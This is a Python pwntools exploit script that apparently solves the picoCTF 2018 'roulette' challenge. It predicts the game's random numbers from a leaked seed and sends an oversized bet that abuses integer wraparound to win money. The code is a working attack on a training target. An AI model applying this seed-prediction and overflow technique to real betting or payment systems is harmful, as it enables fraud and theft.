#!/usr/bin/env python
import ctypes
#
from pwn import log, remote, u32, p32, process
from pwn import ELF, context, args, sleep
context.clear(arch='i386', os='linux')


class Attack:
    def __init__(self, host, port, elf_name, libc_name, gdb_script=None):
        self.host, self.port = host, port
        self.elf_name, self.libc_name = elf_name, libc_name
        self.gdb_script = gdb_script

        self.p = None


    def get_process(self, ld_preload=False):
        p = None
        if args.REMOTE:
            p = remote(self.host, self.port)
        else:
            env = {'LD_PRELOAD': './%s' % self.libc_name} if ld_preload else None
            p = process('./%s' % self.elf_name, env=env)
            if args.GDB:
                gdb.attach(p.pid, self.gdb_script)
        return p


    def get_seed(self):
        self.p.recvuntil('Here, have $')
        seed = self.p.recvuntil(' ', drop=True)
        return int(seed)


    def get_balance(self):
        self.p.recvuntil('Balance: $')
        balance = self.p.recvuntil(' ', drop=True)
        return int(balance)


    @staticmethod
    def calculate_sleep_time(s, q, size, spins):
        sigma_size      = s * (pow(q, size) - 1) / (q - 1)
        s_size          = s * pow(q, size - 1)
        usleep_spins    = s * spins + s * size + sigma_size + s_size
        sleep_time      = float(usleep_spins) / (10 ** 6)
        return sleep_time


    def send_bet_and_choice(self, bet, choice):
        self.p.sendlineafter('\n> ', str(bet))
        self.p.sendlineafter(')\n> ', str(choice))


    def exploit(self):
        libc = ctypes.cdll.LoadLibrary(libc_name)
        LONG_MAX       = 2147483647
        """
            roulette.c
        """
        ROULETTE_SIZE   = 36
        ROULETTE_SPINS  = 128
        MAX_WINS        = 16
        HOTSTREAK       = 3
        s = 12500
        q = 1.1
        SLEEP_TIME_SPIN  = Attack.calculate_sleep_time(s, q, ROULETTE_SIZE, ROULETTE_SPINS)

        with self.get_process(ld_preload=True) as self.p:
            seed = self.get_seed()
            libc.srand(seed)
            log.info('seed: %r', seed)
            choice = 1

            for _ in xrange(HOTSTREAK):
                balance = self.get_balance()
                log.info('current balance: %r', balance)

                wager = (libc.rand() % ROULETTE_SIZE) + 1
                junk = libc.rand()  # not send

                self.send_bet_and_choice(str(0), str(wager))

                log.info("sleep %r", SLEEP_TIME_SPIN)
                sleep(SLEEP_TIME_SPIN)

            for _ in xrange(HOTSTREAK + 1):
                balance = self.get_balance()
                log.info('current balance: %r', balance)

                wager = (libc.rand() % ROULETTE_SIZE) + 1
                junk = libc.rand()  # not send

                self.send_bet_and_choice(str(3994967295), str(1))

                log.info("sleep %r", SLEEP_TIME_SPIN)
                sleep(SLEEP_TIME_SPIN)

            sleep(2)
            print(self.p.recvall())


if __name__ == "__main__":
    host, port = '2018shell2.picoctf.com', 48312
    elf_name, libc_name = 'roulette', 'libc.so.6'

    attack = Attack(host, port, elf_name, libc_name)
    attack.exploit()
